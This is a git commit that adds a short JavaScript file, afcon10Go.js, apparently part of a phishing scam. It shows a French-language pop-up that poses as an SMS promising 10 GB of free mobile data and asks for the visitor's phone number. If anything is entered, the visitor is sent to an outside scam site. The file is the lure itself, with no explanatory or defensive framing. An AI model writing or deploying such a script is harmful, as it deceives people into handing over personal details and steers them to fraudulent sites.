bacad5c20d07304064bcd298303694fb5c221e9d
newetijazz16 <newetijazz16@gmail.com>
2026-01-21 22:35:40 +0100

    Create afcon10Go.js

---
+++ afcon10Go.js
@@ -0,0 +1,6 @@
+var password = 'NUMÉRO DE PORTABLE'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 10 Go, cliquez sur OK pour saisir votre numéro de mobile','NUMÉRO DE PORTABLE');
+if (password != 'NUMÉRO DE PORTABLE') {
+location.href='https://www.knerxbz.site/afcon-10Go';
+}
+ 
